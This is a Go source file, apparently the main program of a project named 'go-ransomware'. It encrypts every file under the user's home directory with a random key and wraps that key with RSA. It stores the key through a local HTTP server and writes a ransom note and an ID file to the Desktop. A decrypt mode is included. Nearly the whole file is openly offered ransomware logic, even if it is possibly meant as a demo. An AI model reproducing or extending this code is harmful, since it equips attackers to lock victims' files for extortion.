package main

import (
	"fmt"
	"os"
	"strings"
	"net/http"
	"crypto/rand"
	"encoding/hex"
	"time"
	"github.com/Ywern1/go-ransomware/handlers"
	"github.com/Ywern1/go-ransomware/walker"
	"github.com/Ywern1/go-ransomware/rsa"
)

func GenerateKey() ([]byte, error) {
	Key := make([]byte, 32)
	_, err := rand.Read(Key)
	if err != nil {
		panic(err)
	}

	return Key, nil
}

func main() {

	HomeDir, err := os.UserHomeDir()
		if err != nil {
			fmt.Println(err)
		}
	fmt.Println(HomeDir)

	var input string

	fmt.Print("Enter Encrypt or Decrypt: ")
	
	fmt.Scanln(&input)

	input = strings.ToLower(input)
	if input == "e" || input == "encrypt" {
		fmt.Println("Encrypting")
		EncKey, err := GenerateKey()
		if err != nil {
			fmt.Println()
		}

		err = walker.EncryptFiles(EncKey, HomeDir)
		if err != nil {
			fmt.Println(err)
		}

		ID := handlers.GenerateRandomString(30)

		http.HandleFunc("/store", handlers.StoreKeyHandler)
		http.HandleFunc("/retrieve", handlers.RetrieveKeyHandler)

		fmt.Println("Starting server on :8080")

		go func(){
			err := http.ListenAndServe(":8080", nil)
				if err != nil {
			panic(err)
		}
		}()

		time.Sleep(time.Second * 5)

		cipherKey, err := rsa.EncryptRsa(EncKey)
		if err != nil {
			fmt.Println(err)
		}

		// Convert the key to a hexadecimal string
		keyStr := hex.EncodeToString(cipherKey)

		handlers.SendKey(ID, keyStr)
	
		rsaKey, err := handlers.GetKey(ID)
		if err != nil {
			fmt.Println(err)
		}
		
		val := `Hello
		Your network/system was encrypted.
		Encrypted files have new extension.
		Your ID is : %s
		`
		
		data := []byte(fmt.Sprintf(val, ID))
		
		//drop a note to the desktop with decryption key
		os.WriteFile(HomeDir+"/Desktop/READ_ME_TO_DECRYPT.txt", data, 0600)

		os.WriteFile(HomeDir+"/Desktop/ID-KEY.txt", rsaKey, 0600)


	} else if input == "d" || input == "decrypt" {

		fmt.Println("Decrypting.")

		plainKey, err := rsa.DecryptRsa()
		if err != nil {
			fmt.Println(err)
		}

		walker.DecryptFiles(plainKey, HomeDir)

	} else {
		fmt.Println("Invalid input.")
	}
}